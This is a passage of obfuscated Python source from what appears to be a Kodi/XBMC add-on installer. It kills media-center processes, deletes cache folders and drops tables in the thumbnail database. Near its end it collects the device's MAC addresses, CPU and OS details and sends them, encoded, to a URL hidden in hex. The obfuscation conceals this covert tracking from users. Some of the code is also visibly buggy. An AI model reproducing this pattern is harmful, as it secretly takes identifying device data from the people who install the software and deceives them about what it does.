   os . system ( 'adb shell kill org.kodi' )
  except :
   pass
  try :
   os . system ( 'adb shell kill org.xbmc.xbmc' )
  except :
   pass
  try :
   os . system ( 'adb shell kill org.xbmc' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.xbmc,kodi());' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.kodi());' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.xbmc.xbmc());' )
  except :
   pass
  try :
   os . system ( 'Process.killProcess(android.os.Process.org.xbmc());' )
  except :
   pass
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  if OoOooO < 14 :
   try :
    I11iiii = open ( os . path . join ( scriptfolder , 'linux_xbmc' ) , 'w+' )
    I11iiii . write ( 'killall XBMC\nkillall -9 xbmc.bin\nXBMC' )
    I11iiii . close ( )
   except :
    pass
   try :
    os . system ( 'chmod a+x ' + os . path . join ( scriptfolder , 'linux_xbmc' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( scriptfolder , 'linux_xbmc' ) )
   except :
    print "### Failed to run: linux_xbmc"
  else :
   try :
    I11iiii = open ( os . path . join ( scriptfolder , 'linux_kodi' ) , 'w+' )
    I11iiii . write ( 'killall Kodi\nkillall -9 kodi.bin\nkodi' )
    I11iiii . close ( )
   except :
    pass
   try :
    os . system ( 'chmod a+x ' + os . path . join ( scriptfolder , 'linux_kodi' ) )
   except :
    pass
   try :
    os . system ( os . path . join ( scriptfolder , 'linux_kodi' ) )
   except :
    print "### Failed to run: linux_kodi"
 else :
  try :
   os . system ( 'killall AppleTV' )
  except :
   pass
  try :
   os . system ( 'sudo initctl stop kodi' )
  except :
   pass
  try :
   os . system ( 'sudo initctl stop xbmc' )
  except :
   pass
   if 45 - 45: ii11IIII11I
   if 21 - 21: OoOo0o . oOOO0OooOoooO . i11Iii / iIII / oOOO0OooOoooO
def O00o0 ( url ) :
 i1iI1 = urllib2 . Request ( url )
 i1iI1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 ii1I1IiiI1ii1i = urllib2 . urlopen ( i1iI1 )
 iiI = ii1I1IiiI1ii1i . read ( )
 ii1I1IiiI1ii1i . close ( )
 return iiI
 if 78 - 78: ii11IIII11I . ooo0O0O00 . i11Iii . IIi1iIi + OoOo0o
 if 16 - 16: o0O0Oooo0O % IIii1I . IIooooo
def oOIIiIi ( url ) :
 i1iI1 = urllib2 . Request ( url )
 i1iI1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 try :
  ii1I1IiiI1ii1i = urllib2 . urlopen ( i1iI1 , timeout = 5 )
 except :
  try :
   ii1I1IiiI1ii1i = urllib2 . urlopen ( i1iI1 , timeout = 5 )
  except :
   try :
    ii1I1IiiI1ii1i = urllib2 . urlopen ( i1iI1 , timeout = 5 )
   except :
    ii1I1IiiI1ii1i = ''
 if ii1I1IiiI1ii1i != '' :
  iiI = ii1I1IiiI1ii1i . read ( )
  ii1I1IiiI1ii1i . close ( )
  return iiI . replace ( '\r' , '\\r' ) . replace ( '\n' , '\\n' ) . replace ( '\t' , '\\t' )
 else :
  return ii1I1IiiI1ii1i
  if 59 - 59: IIIi11I1 * ooOO0O0ooOooO . OOO0O0O0ooooo
  if 56 - 56: IIooooo - o0O00o % IIIi11I1 - ooo0O0O00
def Oo00O ( ) :
 import tarfile
 if 12 - 12: ooo0O0O00 - ii11IIII11I * oOOO0OooOoooO
 if not os . path . exists ( o0OO00oO ) :
  os . makedirs ( o0OO00oO )
  if 14 - 14: iIII - IIooooo % IIooooo * OOO0O0O0ooooo . i11iIiiIii / OOO0O0O0ooooo
 OOO0oOOoo = tarfile . open ( os . path . join ( o0OO00oO , oOOO00o000o ( ) + '.tar' ) , 'w' )
 if 9 - 9: OoOo0o + IIi1iIi / IIi1iIi
 for Ii1I11ii1i in OOoOO0oo0ooO :
  OOO0oOOoo . add ( Ii1I11ii1i )
  if 89 - 89: o0O00o . OOO0O0O0ooooo / Oo00oo0oO % IIIIiiII111 . iIII
 OOO0oOOoo . close ( )
 if 50 - 50: ooOO0O0ooOooO + Oo00oo0oO . O00ooooo00 % ooo0O0O00
 if 5 - 5: IIIIiiII111 / II1 + o0O0Oooo0O * oOOO0OooOoooO - Ii1i1i % IIIi11I1
def IiII1 ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 I1iIi1iIiiIiI = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , addon_id ) )
 forum = str ( forum )
 if 47 - 47: IIooooo + oOOO0OooOoooO / O00ooooo00 % i11iIiiIii
 if not os . path . exists ( I1iIi1iIiiIiI ) :
  i111iI = 1
  if 85 - 85: ooo0O0O00 . IIIIiiII111 / ii11IIII11I . OOO0O0O0ooooo % oOOO0OooOoooO
 else :
  i111iI = 0
  if 90 - 90: iIII % OOO0O0O0ooooo * IIii1I . o0O00o
 repo_id = str ( repo_id )
 I1iii11 = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , repo_id ) )
 if 74 - 74: OOO0O0O0ooooo / O00ooooo00
 if os . path . exists ( I1iIi1iIiiIiI ) :
  OoOIiiiii111i1ii = 1
  i1i1iII1 = i1iiIIiiI111 . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' )
  if 25 - 25: IIii1I % o0O00o . ii11IIII11I
  if i1i1iII1 == 1 :
   Remove_Addons ( I1iIi1iIiiIiI )
   i111iI = 1
 else :
  OoOIiiiii111i1ii = 0
  if 14 - 14: OoOo0o + Oo00oo0oO - o0O00o / OOO0O0O0ooooo . oOOO0OooOoooO
 if i111iI == 1 :
  if 45 - 45: oOOO0OooOoooO
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( I1iii11 ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   Install_Repo ( repo_id )
   if 83 - 83: IIIIiiII111 . II1
  if not os . path . exists ( I1iIi1iIiiIiI ) :
   os . makedirs ( I1iIi1iIiiIiI )
   if 58 - 58: i11iIiiIii + II1 % II1 / o0O0Oooo0O / i11iIiiIii
  iI1111ii1I = os . path . join ( O0OoO000O0OO , addon_id , 'addon.xml' )
  iiI11iI = os . path . join ( O0OoO000O0OO , addon_id , 'default.py' )
  if 62 - 62: Ii1i1i / Oo00oo0oO
  shutil . copyfile ( ooOoOoo0O , iI1111ii1I )
  if 7 - 7: II1 . o0O0Oooo0O
  oOOoO0o0oO = open ( os . path . join ( iI1111ii1I ) , mode = 'r' )
  oOOO = oOOoO0o0oO . read ( )
  oOOoO0o0oO . close ( )
  if 53 - 53: IIooooo % IIooooo * ooo0O0O00 + IIIIiiII111
  if 92 - 92: II1 + O00ooooo00 / IIooooo * OOO0O0O0ooooo
  O00oOo00o0o = re . compile ( 'testid[\s\S]*?' ) . findall ( oOOO )
  O00oO0 = O00oOo00o0o [ 0 ] if ( len ( O00oOo00o0o ) > 0 ) else 'None'
  IiII111i1i11 = re . compile ( 'testname[\s\S]*?' ) . findall ( oOOO )
  ooo = IiII111i1i11 [ 0 ] if ( len ( IiII111i1i11 ) > 0 ) else 'None'
  i111iIi1i1II1 = re . compile ( 'testprovider[\s\S]*?' ) . findall ( oOOO )
  O0Oo00OoOo = i111iIi1i1II1 [ 0 ] if ( len ( i111iIi1i1II1 ) > 0 ) else 'None'
  ii1ii111 = re . compile ( 'testprovides[\s\S]*?' ) . findall ( oOOO )
  i11111I1I = ii1ii111 [ 0 ] if ( len ( ii1ii111 ) > 0 ) else 'None'
  IIIIiII1i = oOOO . replace ( O00oO0 , addon_id ) . replace ( ooo , name ) . replace ( O0Oo00OoOo , provider_name ) . replace ( i11111I1I , contenttypes )
  if 11 - 11: II1 . oOOO0OooOoooO
  I11iiii = open ( iI1111ii1I , mode = 'w+' )
  I11iiii . write ( str ( IIIIiII1i ) )
  I11iiii . close ( )
  if 80 - 80: II1 - i11Iii * IIooooo * Oo00oo0oO / IIIi11I1 / i11Iii
  O0i1iI = open ( iiI11iI , mode = 'w' )
  O0i1iI . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + addon_id + '"\nAddonName="' + name + '"\ndialog=xbmcgui.Dialog()\nxbmc.executebuiltin("UpdateLocalAddons")\nxbmc.executebuiltin("UpdateAddonRepos")\nchoice=dialog.yesno(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating, would you like check the status of your add-on updates or try re-installing via the Total Installer backup method? We highly recommend checking for updates.",yeslabel="Install Option 2", nolabel="Check Updates")\nif choice==0: xbmc.executebuiltin(\'ActivateWindow(10040,"addons://outdated/",return)\')\nelse: xbmc.executebuiltin(\'ActivateWindow(10001,"plugin://plugin.program.tbs/?mode=grab_addons&url=%26redirect%26addonid%3d\'+AddonID+\'")\')\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
  O0i1iI . close ( )
  if 13 - 13: oOOO0OooOoooO * ii11IIII11I + i11iIiiIii * oOOO0OooOoooO - ii11IIII11I
  xbmc . sleep ( 1000 )
  if 23 - 23: IIii1I * O00ooooo00 % II1 * o0O0Oooo0O
  if os . path . exists ( I1iIi1iIiiIiI ) and OoOIiiiii111i1ii == 0 :
   I1Iiiiiii = 'http://totalxbmc.com/totalrevolution/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   O00o0 ( I1Iiiiiii )
   if 39 - 39: o0O0Oooo0O * iIII + IIii1I - o0O0Oooo0O + i11Iii
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  i1iiIIiiI111 . ok ( name + " Install Complete" , '[COLOR=dodgerblue]' + name + '[/COLOR] has now been installed, please allow a few moments for Kodi to update the add-on and it\'s dependencies.' )
  if 69 - 69: OOO0O0O0ooooo
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 85 - 85: ii11IIII11I / OOO0O0O0ooooo
 if 18 - 18: ooo0O0O00 % OOO0O0O0ooooo * Oo00oo0oO
def o0Iii ( ) :
 I1iiiiI1iI = xbmc . translatePath ( 'special://home/userdata/Database/Textures13.db' )
 try :
  iIiiiii1i = database . connect ( I1iiiiI1iI )
  iiIi1IIiI = iIiiiii1i . cursor ( )
  iiIi1IIiI . execute ( "DROP TABLE IF EXISTS path" )
  iiIi1IIiI . execute ( "VACUUM" )
  iIiiiii1i . commit ( )
  iiIi1IIiI . execute ( "DROP TABLE IF EXISTS sizes" )
  iiIi1IIiI . execute ( "VACUUM" )
  iIiiiii1i . commit ( )
  iiIi1IIiI . execute ( "DROP TABLE IF EXISTS texture" )
  iiIi1IIiI . execute ( "VACUUM" )
  iIiiiii1i . commit ( )
  iiIi1IIiI . execute ( """CREATE TABLE path (id integer, url text, type text, texture text, primary key(id))""" )
  iIiiiii1i . commit ( )
  iiIi1IIiI . execute ( """CREATE TABLE sizes (idtexture integer,size integer, width integer, height integer, usecount integer, lastusetime text)""" )
  iIiiiii1i . commit ( )
  iiIi1IIiI . execute ( """CREATE TABLE texture (id integer, url text, cachedurl text, imagehash text, lasthashcheck text, PRIMARY KEY(id))""" )
  iIiiiii1i . commit ( )
 except :
  pass
  if 23 - 23: IIooooo . i11Iii
  if 9 - 9: ii11IIII11I - Oo00oo0oO - o0O00o
def o0O0Oo00 ( ) :
 o0Iii ( )
 O0Oo0o000oO ( )
 if 99 - 99: OoOo0o * ooOO0O0ooOooO * oOOO0OooOoooO
 if 92 - 92: iIII
def iI11I ( command , SF_folder , SF_link ) :
 ooO000 = 'SF'
 if 57 - 57: ooOO0O0ooOooO
 oOOOoo = xbmc . translatePath ( os . path . join ( ii11iIi1I , 'plugin.program.super.favourites' , 'Super Favourites' , SF_folder ) )
 Ii1ii111i1 = os . path . join ( oOOOoo , 'favourites.xml' )
 if 31 - 31: i11Iii + OOO0O0O0ooooo
 if command == 'add' :
  if 87 - 87: ii11IIII11I
  if not os . path . exists ( oOOOoo ) :
   os . makedirs ( oOOOoo )
   oooo0O0 = open ( Ii1ii111i1 , mode = 'w+' )
   oooo0O0 . write ( '<favourites>\n</favourites>' )
   oooo0O0 . close ( )
   if 45 - 45: Ii1i1i / II1 - o0O00o / IIooooo % o0O0Oooo0O
   if 83 - 83: IIIi11I1 . IIii1I - o0O0Oooo0O * i11iIiiIii
  IiI11i1IIiiI = open ( Ii1ii111i1 , mode = 'r' )
  oOOo000oOoO0 = IiI11i1IIiiI . read ( )
  IiI11i1IIiiI . close ( )
  if 86 - 86: ooOO0O0ooOooO % i11iIiiIii + IIooooo % i11iIiiIii
  Ooo0o0OOO = re . compile ( '<favourite name="[\s\S]*?\/favourites>' ) . findall ( oOOo000oOoO0 )
  i11IiII = Ooo0o0OOO [ 0 ] if ( len ( Ooo0o0OOO ) > 0 ) else '\n</favourites>'
  if 85 - 85: OoOo0o - IIii1I / OOO0O0O0ooooo
  if 99 - 99: ooOO0O0ooOooO * o0O0Oooo0O % IIii1I / IIooooo
  oooo0O0 = open ( oOoOooOo0o0 , mode = 'r' )
  OOO00O0oOOo = oooo0O0 . read ( )
  oooo0O0 . close ( )
  if 71 - 71: IIi1iIi / ooo0O0O00 / oOOO0OooOoooO % i11Iii
  if 51 - 51: o0O0Oooo0O * OOO0O0O0ooooo / ooOO0O0ooOooO . IIooooo % i11Iii / IIIi11I1
  if not OOO00O0oOOo in oOOo000oOoO0 :
   oooo0O0 = open ( Ii1ii111i1 , mode = 'w+' )
   if i11IiII == '\n</favourites>' :
    ii1iii1I1I = oooo0O0 . write ( '<favourites>\n\t' + OOO00O0oOOo + i11IiII )
   else :
    ii1iii1I1I = oooo0O0 . write ( '<favourites>\n\t' + OOO00O0oOOo + '\n\t' + i11IiII )
   oooo0O0 . close ( )
   if 95 - 95: o0O0Oooo0O
 if command == 'delete' :
  if 51 - 51: ooOO0O0ooOooO + o0O0Oooo0O . O00ooooo00 . Oo00oo0oO + IIIIiiII111 * IIIi11I1
  if 72 - 72: OoOo0o + OoOo0o / ooOO0O0ooOooO . II1 % IIooooo
  try :
   IiI11i1IIiiI = open ( Ii1ii111i1 , mode = 'r' )
   oOOo000oOoO0 = IiI11i1IIiiI . read ( )
   IiI11i1IIiiI . close ( )
   if 49 - 49: OoOo0o . Ii1i1i - iIII * II1 . iIII
   if 2 - 2: II1 % i11Iii
   oooo0O0 = open ( oOoOooOo0o0 , mode = 'r' )
   OOO00O0oOOo = oooo0O0 . read ( )
   oooo0O0 . close ( )
   if 63 - 63: IIIi11I1 % IIii1I
   if 39 - 39: o0O00o / ooOO0O0ooOooO / Oo00oo0oO % IIIi11I1
   oooo0O0 = open ( Ii1ii111i1 , mode = 'w+' )
   ii1iii1I1I = oooo0O0 . write ( oOOo000oOoO0 . replace ( '\n\t' + OOO00O0oOOo , '' ) )
   oooo0O0 . close ( )
  except :
   pass
   if 89 - 89: oOOO0OooOoooO + II1 + oOOO0OooOoooO * O00ooooo00 + IIii1I % IIi1iIi
   if 59 - 59: i11Iii + i11iIiiIii
 if command == 'delfolder' :
  if 88 - 88: i11iIiiIii - ii11IIII11I
  try :
   shutil . rmtree ( oOOOoo )
  except :
   pass
   if 67 - 67: i11Iii . iIII + IIIIiiII111 - II1
   if 70 - 70: i11Iii / ooOO0O0ooOooO - IIii1I - o0O00o
def Iii ( heading , anounce ) :
 iIi1i = 'TXT'
 class i1ii ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : O0ooO0ooo0oO = open ( anounce ) ; ii = O0ooO0ooo0oO . read ( )
   except : ii = anounce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( ii ) )
   return
 i1ii ( )
 while xbmc . getCondVisibility ( 'Window.IsVisible(textviewer)' ) :
  xbmc . sleep ( 500 )
  if 81 - 81: OOO0O0O0ooooo % IIooooo
  if 5 - 5: II1 - Ii1i1i + o0O0Oooo0O - o0O00o . Ii1i1i / ii11IIII11I
def Oo0o0O00 ( ) :
 try :
  i1I1i1i1iII1 = oOo000 ( 'wifi' )
 except :
  i1I1i1i1iII1 = 'Unknown'
 try :
  IIi = oOo000 ( 'eth0' )
 except :
  IIi = 'Unknown'
 try :
  i11II11II1 = II1IOoOo000oOo0oo ( )
 except :
  i11II11II1 = 'Unknown'
 try :
  oO0O = oOO ( )
 except :
  oO0O = 'Unknown'
  if 11 - 11: i11iIiiIii - OoOo0o . OoOo0o
 ooo00Ooo = i1I1i1i1iII1 + '&' + i11II11II1 + '&' + oO0O + '&' + IIi . replace ( ' ' , '%20' )
 return ooo00Ooo
 if 31 - 31: i11Iii / iIII * O00ooooo00 . IIIIiiII111
 if 57 - 57: i11Iii + IIii1I % O00ooooo00 % IIIi11I1
def OO0oo ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 I1iii11 = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , repo_id ) )
 I1iIi1iIiiIiI = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , addon_id ) )
 if 15 - 15: IIii1I % II1 - iIII * IIooooo + IIi1iIi
 if os . path . exists ( I1iIi1iIiiIiI ) :
  if 11 - 11: o0O00o * IIooooo - IIIIiiII111
  i1i1iII1 = i1iiIIiiI111 . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' )
  if 66 - 66: IIIIiiII111 . i11iIiiIii - o0O00o * ooo0O0O00 + II1 * Oo00oo0oO
  if i1i1iII1 == 1 :
   Remove_Addons ( I1iIi1iIiiIiI )
   if 74 - 74: iIII
 if os . path . exists ( I1iii11 ) :
  if 61 - 61: iIII - oOOO0OooOoooO * ooOO0O0ooOooO % ii11IIII11I * IIii1I + Ii1i1i
  if os . path . exists ( I1iIi1iIiiIiI ) :
   OoOIiiiii111i1ii = 1
   if 71 - 71: IIi1iIi / IIi1iIi * OoOo0o * OoOo0o / ooOO0O0ooOooO
  else :
   OoOIiiiii111i1ii = 0
   if 35 - 35: i11Iii * ooo0O0O00 * IIIi11I1 % iIII . IIIIiiII111
  i1i1iII1 = i1iiIIiiI111 . yesno ( 'WARNING!' , '[COLOR=orange]This Add-on may be unlawful in your region.[/COLOR][CR]The repository required for installation of this add-on has been detected on your system. Would you like to continue to the Kodi addon browser to install?' )
  if 58 - 58: IIi1iIi + ooOO0O0ooOooO * o0O00o * i11iIiiIii - IIii1I
  if i1i1iII1 == 1 :
   if 68 - 68: II1 % ooOO0O0ooOooO
   if 'video' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.video/?",return)' )
    if 26 - 26: ooOO0O0ooOooO % i11iIiiIii % IIii1I % IIi1iIi * IIi1iIi * Oo00oo0oO
   elif 'executable' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.executable/?",return)' )
    if 24 - 24: ooOO0O0ooOooO % oOOO0OooOoooO - ii11IIII11I + IIIi11I1 * Oo00oo0oO
   elif 'audio' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.audio/?",return)' )
    if 2 - 2: IIooooo - o0O0Oooo0O
  xbmc . sleep ( 2000 )
  if 83 - 83: OoOo0o % ooo0O0O00 % IIooooo - ooOO0O0ooOooO * i11Iii / II1
  if os . path . exists ( I1iIi1iIiiIiI ) and OoOIiiiii111i1ii == 0 :
   I1Iiiiiii = 'http://totalxbmc.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   O00o0 ( I1Iiiiiii )
   if 18 - 18: Ii1i1i + IIii1I - ooOO0O0ooOooO - IIIi11I1
 else :
  i1iiIIiiI111 . ok ( 'WARNING!' , '[COLOR=orange]This add-on may possibly be unlawful in your region.[/COLOR][CR]If you\'ve investigated the legality of it and are happy to install then you must have the following repository installed: [COLOR=dodgerblue]' + repo_id + '[/COLOR]' )
  if 71 - 71: II1
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 33 - 33: oOOO0OooOoooO
OOO0ooo = binascii . unhexlify ( '6164646f6e2e786d6c' )
IIiiii = xbmc . translatePath ( os . path . join ( O0OoO000O0OO , OO0o , OOO0ooo ) )
if 37 - 37: ooo0O0O00 % ii11IIII11I
def oOOO00o000o ( ) :
 O0II11i11II = time . time ( )
 II1Ii1iI1i1 = time . localtime ( O0II11i11II )
 return time . strftime ( '%Y%m%d%H%M%S' , II1Ii1iI1i1 )
 if 54 - 54: OOO0O0O0ooooo
def III1I1Iii1iiI ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 if 68 - 68: Ii1i1i * ooo0O0O00 . ii11IIII11I % OoOo0o % oOOO0OooOoooO
oooo0OO = open ( IIiiii , mode = 'r' )
oOOO = file . read ( oooo0OO )
file . close ( oooo0OO )
iIIi1I = re . compile ( binascii . unhexlify ( '3c726566323e' ) + '(.+?)' + binascii . unhexlify ( '3c2f726566323e' ) ) . findall ( oOOO )
OO0o0o0oo0O = iIIi1I [ 0 ] if ( len ( iIIi1I ) > 0 ) else ''
IIiI1I1 = hashlib . md5 ( open ( OOOOi11i1 , 'rb' ) . read ( ) ) . hexdigest ( )
if 15 - 15: IIooooo * iIII % Oo00oo0oO * IIii1I - i11iIiiIii
if 60 - 60: IIIi11I1 * oOOO0OooOoooO % Ii1i1i + OoOo0o
if 52 - 52: O00ooooo00
if not os . path . exists ( OOOOoo0Oo ) and oO == 'true' :
 I11iiii = open ( OOOOoo0Oo , 'w+' )
 I11iiii . close ( )
 if 84 - 84: IIooooo / o0O0Oooo0O
def O0Oo0o000oO ( ) :
 OOOooo0OooOoO = os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' ) ) )
 if 91 - 91: OoOo0o + IIIi11I1
 OoOooo = [
 ( OOOooo0OooOoO ) ,
 ( ii11iIi1I ) ,
 ( os . path . join ( i1iiIII111ii , 'cache' ) ) ,
 ( os . path . join ( i1iiIII111ii , 'temp' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' ) ) ,
 ( os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' ) ) ,
 ( os . path . join ( ii11iIi1I , 'script.module.simple.downloader' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'script.module.simple.downloader' ) ) ) ) ,
 ( os . path . join ( ii11iIi1I , 'plugin.video.itv' , 'Images' ) ) ,
 ( os . path . join ( xbmc . translatePath ( os . path . join ( 'special://profile' , 'addon_data' , 'plugin.video.itv' , 'Images' ) ) ) ) ]
 if 74 - 74: IIii1I * o0O0Oooo0O % IIIIiiII111
 for OooOoOO0 in OoOooo :
  if os . path . exists ( OooOoOO0 ) and OooOoOO0 != ii11iIi1I and OooOoOO0 != OOOooo0OooOoO :
   for iiI11iIi , oo , oOO0OO0O in os . walk ( OooOoOO0 ) :
    o00o = 0
    o00o += len ( oOO0OO0O )
    if o00o > 0 :
     for O0ooO0ooo0oO in oOO0OO0O :
      try :
       os . unlink ( os . path . join ( iiI11iIi , O0ooO0ooo0oO ) )
      except :
       pass
     for III11I in oo :
      try :
       shutil . rmtree ( os . path . join ( iiI11iIi , III11I ) )
       print "### Successfully cleared " + str ( o00o ) + " files from " + os . path . join ( OooOoOO0 , III11I )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( OooOoOO0 , III11I )
  else :
   for iiI11iIi , oo , oOO0OO0O in os . walk ( OooOoOO0 ) :
    for III11I in oo :
     if 'Cache' in III11I or 'cache' in III11I or 'CACHE' in III11I :
      try :
       shutil . rmtree ( os . path . join ( iiI11iIi , III11I ) )
       print "### Successfully wiped " + os . path . join ( OooOoOO0 , III11I )
      except :
       print "### Failed to wipe cache in: " + os . path . join ( OooOoOO0 , III11I )
       if 17 - 17: II1 + i11Iii * IIi1iIi * IIIIiiII111
       if 36 - 36: OOO0O0O0ooooo + iIII
 try :
  iIIIi1i1I11i = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
  iIiiiii1i = database . connect ( iIIIi1i1I11i )
  iiIi1IIiI = iIiiiii1i . cursor ( )
  iiIi1IIiI . execute ( "DROP TABLE IF EXISTS rel_list" )
  iiIi1IIiI . execute ( "VACUUM" )
  iIiiiii1i . commit ( )
  iiIi1IIiI . execute ( "DROP TABLE IF EXISTS rel_lib" )
  iiIi1IIiI . execute ( "VACUUM" )
  iIiiiii1i . commit ( )
 except :
  pass
  if 55 - 55: iIII - i11Iii
def II1IOoOo000oOo0oo ( ) :
 OoOooO = str ( I1I1IiI1 [ : 2 ] )
 if OoOooO < 14 :
  O0OO0O = os . path . join ( oo0OooOOo0 , 'xbmc.log' )
  if 49 - 49: IIii1I - OOO0O0O0ooooo . O00ooooo00 - II1
 else :
  O0OO0O = os . path . join ( oo0OooOOo0 , 'kodi.log' )
  if 37 - 37: O00ooooo00 . IIi1iIi % IIIIiiII111 + II1 / o0O00o
 iiIiIiii = open ( O0OO0O , 'r' )
 Oo0OooO0 = iiIiIiii . read ( )
 iiIiIiii . close ( )
 if 87 - 87: OoOo0o % IIooooo
 oo0OOOoOo = re . compile ( 'Host CPU: (.+?) available' ) . findall ( Oo0OooO0 )
 IIiiIIi1 = oo0OOOoOo [ 0 ] if ( len ( oo0OOOoOo ) > 0 ) else ''
 return IIiiIIi1 . replace ( ' ' , '%20' )
 if 51 - 51: IIIIiiII111
 if 14 - 14: o0O0Oooo0O % OoOo0o % iIII - i11iIiiIii
 if 53 - 53: IIooooo % iIII
 if 59 - 59: i11Iii % IIii1I . O00ooooo00 + ooOO0O0ooOooO * o0O0Oooo0O
 if 41 - 41: IIooooo % Oo00oo0oO
 if 12 - 12: i11Iii
 if 69 - 69: II1 + i11Iii
 if 26 - 26: iIII + i11Iii / Ii1i1i % IIIIiiII111 % Oo00oo0oO + ooOO0O0ooOooO
 if 31 - 31: IIi1iIi % i11Iii * IIi1iIi
def oOO ( ) :
 OoOooO = str ( I1I1IiI1 [ : 2 ] )
 if OoOooO < 14 :
  O0OO0O = os . path . join ( oo0OooOOo0 , 'xbmc.log' )
  if 45 - 45: O00ooooo00 . IIIi11I1 + i11Iii - II1 % ii11IIII11I
 else :
  O0OO0O = os . path . join ( oo0OooOOo0 , 'kodi.log' )
  if 1 - 1: IIii1I
 iiIiIiii = open ( O0OO0O , 'r' )
 Oo0OooO0 = iiIiIiii . read ( )
 iiIiIiii . close ( )
 if 93 - 93: O00ooooo00 . i11iIiiIii . iIII
 O0O00OOo = re . compile ( 'Running on (.+?)\n' ) . findall ( Oo0OooO0 )
 OoOOo = O0O00OOo [ 0 ] if ( len ( O0O00OOo ) > 0 ) else ''
 return OoOOo . replace ( ' ' , '%20' )
 if 17 - 17: O00ooooo00
 if 1 - 1: ii11IIII11I
def oOo000 ( protocol ) :
 if sys . platform == 'win32' :
  for oOO0oo in os . popen ( "ipconfig /all" ) :
   if oOO0oo . lstrip ( ) . startswith ( 'Physical Address' ) :
    II1iIi1IiIii = oOO0oo . split ( ':' ) [ 1 ] . strip ( ) . replace ( '-' , ':' )
    break
    if 30 - 30: ii11IIII11I % o0O00o * i11Iii - Oo00oo0oO * IIooooo % ii11IIII11I
 if xbmc . getCondVisibility ( 'System.Platform.Android' ) :
  if protcol == 'wifi' :
   iIIi = open ( '/sys/class/net/wlan0/address' , mode = 'r' )
  else :
   iIIi = open ( '/sys/class/net/eth0/address' , mode = 'r' )
  II1iIi1IiIii = iIIi . read ( )
  II1iIi1IiIii = II1iIi1IiIii [ : 17 ]
  iIIi . close ( )
  if 46 - 46: i11iIiiIii - OOO0O0O0ooooo . OoOo0o
 else :
  if protocol == 'wifi' :
   for oOO0oo in os . popen ( "/sbin/ifconfig" ) :
    if oOO0oo . find ( 'wlan0' ) > - 1 :
     II1iIi1IiIii = oOO0oo . split ( ) [ 4 ]
     break
  else :
   for oOO0oo in os . popen ( "/sbin/ifconfig" ) :
    if oOO0oo . find ( 'eth0' ) > - 1 :
     II1iIi1IiIii = oOO0oo . split ( ) [ 4 ]
     break
 return str ( II1iIi1IiIii )
 if 100 - 100: IIIi11I1 / ooo0O0O00 * o0O00o . OOO0O0O0ooooo / i11Iii
def oOO0o000Oo00o ( ) :
 i1I1i1i1iII1 = oOo000 ( 'wifi' )
 IIi = oOo000 ( 'eho0' )
 i11II11II1 = II1IOoOo000oOo0oo ( )
 oO0O = oOO ( )
 ooo00Ooo = i1I1i1i1iII1 + '&' + i11II11II1 + '&' + oO0O + '&' + IIi . replace ( ' ' , '%20' )
 iiI = O00o0 ( I1ii1I1iiii ( 'd' , '6773736f392e2e736b61612d6c642e7264736d6e6d642d6f676f3e773c011510030A' ) + I1ii1I1iiii ( 'e' , ooo00Ooo ) )
 if 21 - 21: II1 - IIii1I
def I1ii1I1iiii ( mode , message ) :
 if mode == 'e' :
  import random
  oOoO0O0o0Oooo = 0
  OO0OoOOO0 = ''
  while oOoO0O0o0Oooo < 4 :
   oOoO0O0o0Oooo += 1
